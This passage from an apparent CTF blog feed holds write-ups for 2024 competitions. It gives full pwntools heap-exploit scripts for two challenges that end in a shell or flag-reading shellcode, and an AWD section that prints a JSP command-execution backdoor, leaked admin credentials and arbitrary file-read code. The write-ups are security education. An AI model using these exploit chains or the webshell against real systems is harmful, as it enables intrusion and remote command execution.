class="hljs-number">0x13</span>+p64(gadget))<br>p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,<span class="hljs-string">&quot;123&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="easybuf"><a href="#easybuf" class="headerlink" title="easybuf"></a>easybuf</h2><p>赛后出的</p><p>一个使用了protobuf的菜单题，只能申请0x30字节的chunk，输出的超过三次会关闭输出句柄，不过释放时存在uaf，所以可以利用fast bin构造tcache bin中的double free，之后就可以任意地址写了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> varint<br><span class="hljs-keyword">import</span> sys<br>num=<span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Mode</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span>+varint.encode(m&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Ind</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x18&#x27;</span>+varint.encode(i&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Spbuf</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> s:<br>        s=<span class="hljs-number">0x30</span><br>    <span class="hljs-keyword">else</span>:<br>        s=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x20&#x27;</span>+varint.encode(s&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Data</span>(<span class="hljs-params">d</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0a&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(d))+d<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Spchr</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x28&#x27;</span>+varint.encode(s)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">data</span>):<br>    mark=<span class="hljs-number">0xfff000000000</span><br>    data1=data&amp;mark<br>    result=<span class="hljs-number">0</span><br>    result|=data1<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        data1=((data1&gt;&gt;<span class="hljs-number">12</span>)^data)&amp;(mark&gt;&gt;<span class="hljs-number">12</span>)<br>        result|=data1<br>        mark=mark&gt;&gt;<span class="hljs-number">12</span><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    payload=Mode(<span class="hljs-number">1</span>)+Ind(ind)+Data(data)+Spbuf(<span class="hljs-number">0</span>)+Spchr(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">2</span>)+Ind(ind)+Data(<span class="hljs-string">b&#x27;test&#x27;</span>)+Spbuf(<span class="hljs-number">0</span>)+Spchr(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">none</span>():<br>    payload=Mode(<span class="hljs-number">0</span>)+Ind(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;test&#x27;</span>)+Spbuf(<span class="hljs-number">0</span>)+Spchr(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind,isbuf=<span class="hljs-number">0</span>,spchr=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">global</span> num<br>    payload=Mode(<span class="hljs-number">3</span>)+Ind(ind)+Spbuf(isbuf)+Spchr(spchr)+Data(<span class="hljs-string">b&#x27;test&#x27;</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>        p.readuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>        num+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br>        pause<br><span class="hljs-comment">#        p.readuntil(&#x27;Content:&#x27;)</span><br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>p=process([<span class="hljs-string">&quot;./pwn&quot;</span>])<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;0&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;testtest&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=d-<span class="hljs-number">0x21ac30</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>stdout=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>vtable=stdout+<span class="hljs-number">0xd0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(vtable))<br>obstack_jump=libc.address+<span class="hljs-number">0x2173c0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(i+<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i)<br><br>show(<span class="hljs-number">1</span>)<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>chunk0=calc(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk0=: x&#125;</span>&quot;</span>)<br>free(<span class="hljs-number">7</span>)<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>chunk6=chunk0+<span class="hljs-number">0x1d60</span><br>chunk7=chunk0+<span class="hljs-number">0x2020</span><br>obstack=p64(system)<br>obstack+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(chunk7+<span class="hljs-number">8</span>)<br><span class="hljs-comment">#obstack=obstack.ljust(0x28,b&#x27;\x00&#x27;)+p64(0x7fffffffffffffff)+p64(0)+p64(system)</span><br><br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+p64((chunk6&gt;&gt;<span class="hljs-number">12</span>)^(chunk7-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">6</span>,payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk6=: x&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk7=: x&#125;</span>&quot;</span>)<br><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">8</span>,p64((chunk7&gt;&gt;<span class="hljs-number">12</span>)^(chunk6)))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(vtable))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0</span>,obstack)<br><br><span class="hljs-comment">#show(0)</span><br><span class="hljs-comment">#show(0)</span><br><span class="hljs-comment">#@add(0)</span><br>free(<span class="hljs-number">6</span>)<br><span class="hljs-comment">#add(8,p64()</span><br><br><br>gdb.attach(p)<br>pause()<br>add(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x40</span>)+p64(((chunk6+<span class="hljs-number">0x10</span>)&gt;&gt;<span class="hljs-number">12</span>)^(vtable)))<br><br><span class="hljs-comment">#add(1,obstack)#</span><br>payload1=p64(<span class="hljs-number">0</span>)+p64(obstack_jump)+p64(chunk7-<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">2</span>,payload1)<br>add(<span class="hljs-number">2</span>,payload1)<br><span class="hljs-comment">#add(0)</span><br><br><span class="hljs-comment">#print(hex(calc(d)))</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">l,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(l).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>,data);<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;idx&quot;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)).encode())<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&quot;EzHeap&quot;)</span><br>p=remote(<span class="hljs-string">&quot;8.147.134.47&quot;</span>,<span class="hljs-string">&quot;35955&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp setcontext+0x3d&#x27;)</span><br>add(<span class="hljs-number">0x300</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x448</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x300</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x300</span>) <span class="hljs-comment">#4</span><br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span>+<span class="hljs-string">b&#x27;rotwilll&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br><br>p.readuntil(<span class="hljs-string">&#x27;rotwilll&#x27;</span>)<br>large=u64(p.readuntil(<span class="hljs-string">&#x27;Welcome&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(large))<br>pause()<br>libc.address=large-<span class="hljs-number">0x21b0e0</span><br>stdout=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>iolist=libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>success(<span class="hljs-string">f&quot;libcaddr=0x<span class="hljs-subst">&#123;libc.address:x&#125;</span>&quot;</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span>+p64(<span class="hljs-number">0x451</span>)+p64(large)*<span class="hljs-number">2</span>+p64(iolist-<span class="hljs-number">0x20</span>)*<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span>+<span class="hljs-string">b&#x27;rotwilll&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27;rotwilll&#x27;</span>)<br>chunk=u64(p.readuntil(<span class="hljs-string">&#x27;Welcome&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(chunk))<br><br>fake_io_add=chunk<br>chunk1=chunk-<span class="hljs-number">0x300</span><br>gs=chunk1<br>shelladd=chunk1+<span class="hljs-number">0x200</span><br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>)+shellcraft.read(<span class="hljs-number">3</span>,chunk,<span class="hljs-number">0x300</span>)+shellcraft.write(<span class="hljs-number">1</span>,chunk,<span class="hljs-number">0x300</span>)<br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>setcontext=libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0x167420</span><br><br>fake_io=flat(&#123;<br>    <span class="hljs-number">0x28</span>: [gs,<span class="hljs-number">1</span>],<br>    <span class="hljs-number">0x98</span>: fake_io_add+<span class="hljs-number">0x28</span>,<br>    <span class="hljs-number">0xa0</span>: fake_io_add,<br>    <span class="hljs-number">0xd8</span>: wfile_jump+<span class="hljs-number">0x30</span>,<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>gsdata=flat(&#123;<br>    <span class="hljs-number">8</span>: [gs,shelladd],<br>    <span class="hljs-number">0x20</span>: setcontext+<span class="hljs-number">0x3d</span>,<br>    <span class="hljs-number">0x28</span>: gadget,<br>    <span class="hljs-number">0x68</span>: gs&amp;(~<span class="hljs-number">0xfff</span>), <span class="hljs-comment"># rdi</span><br>    <span class="hljs-number">0x70</span>: <span class="hljs-number">0x1000</span>, <span class="hljs-comment"># rsi</span><br>    <span class="hljs-number">0x88</span>: <span class="hljs-number">7</span>, <span class="hljs-comment"># rdx</span><br>    <span class="hljs-number">0xa0</span>: gs+<span class="hljs-number">0x10</span>, <span class="hljs-comment">#rsp</span><br>    <span class="hljs-number">0xa8</span>: mprotect, <span class="hljs-comment">#rcx-&gt;rip</span><br>    <span class="hljs-number">0xe0</span>: gs<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-comment">#payload=fake_io#+asm(shellcode)</span><br><br>payload=gsdata<br>payload=payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=asm(shellcode)<br>payload=payload.ljust(<span class="hljs-number">0x300</span>)<br><span class="hljs-comment">#add(0x438,payload[0x10:])</span><br>payload=payload+fake_io<br><br>edit(<span class="hljs-number">2</span>,payload)<br><br><span class="hljs-comment">#exit()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><p><img src="/img/wp/2024/2024ciscn-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81-1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h1&gt;&lt;h2 id=&quot;Power-Trajectory-Diagram&quot;&gt;&lt;a href=&quot;#Power-Trajectory-Diag</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="ciscn" scheme="https://www.dr0n.top/tags/ciscn/"/>
    
    <category term="2024" scheme="https://www.dr0n.top/tags/2024/"/>
    
  </entry>
  
  <entry>
    <title>第一届长城杯信息安全铁人三项赛半决赛（第三赛区）AWD WP</title>
    <link href="https://www.dr0n.top/posts/359b7a99/"/>
    <id>https://www.dr0n.top/posts/359b7a99/</id>
    <published>2024-04-21T08:00:00.000Z</published>
    <updated>2024-05-15T15:56:39.829Z</updated>
    
    <content type="html"><![CDATA[<p>rank: 6</p><h1 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h1><h2 id="漏洞1-文件上传getshell"><a href="#漏洞1-文件上传getshell" class="headerlink" title="漏洞1-文件上传getshell"></a>漏洞1-文件上传getshell</h2><p><code>data.sql</code>泄露教师账号密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `teacher` <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin1&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;admin@qq.com&#x27;</span>);<br></code></pre></td></tr></table></figure><p>登录后台<code>login.jsp</code></p><p>后台用户上传头像处存在任意文件上传</p><p><img src="/img/awd/ccb-tomcat-1.png"></p><p><strong>攻击：</strong></p><p><img src="/img/awd/ccb-tomcat-2.png"></p><p><strong>修复：</strong></p><p>修改后台密码&#x2F;修改上传代码&#x2F;增加waf</p><h2 id="漏洞2-默认后门"><a href="#漏洞2-默认后门" class="headerlink" title="漏洞2-默认后门"></a>漏洞2-默认后门</h2><p><code>\webapps\ROOT\forget.jsp</code>存在后门</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmdParameter</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd1&quot;</span>);<br>    <span class="hljs-keyword">if</span> (cmdParameter != <span class="hljs-literal">null</span> &amp;&amp; !cmdParameter.isEmpty()) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 构建系统命令</span><br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>();<br>            processBuilder.command(<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmdParameter);<br><br>            <span class="hljs-comment">// 执行命令并获取输出</span><br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> processBuilder.start();<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream));<br>            String line;<br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                output.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-comment">// 输出命令执行结果</span><br>            out.println(<span class="hljs-string">&quot;Command executed successfully. Output:\n&quot;</span> + output.toString());<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            out.println(<span class="hljs-string">&quot;Error executing command: &quot;</span> + e.getMessage());<br>        &#125;<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><strong>攻击：</strong></p><p>开局很快都修复了，手动交了两三个</p><p><strong>修复：</strong></p><p>把密码改了</p><h1 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h1><h2 id="漏洞1-任意文件读取"><a href="#漏洞1-任意文件读取" class="headerlink" title="漏洞1-任意文件读取"></a>漏洞1-任意文件读取</h2><p><code>\app\frontend\controller\Ajax.php</code> 存在任意文件读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">root_path</span>().<span class="hljs-string">&#x27;public/storage/uploads/&#x27;</span>.<span class="hljs-variable">$file</span>;<br>    <span class="hljs-comment">// 检查文件是否存在</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-variable">$result</span> = [<span class="hljs-string">&#x27;code&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">lang</span>(<span 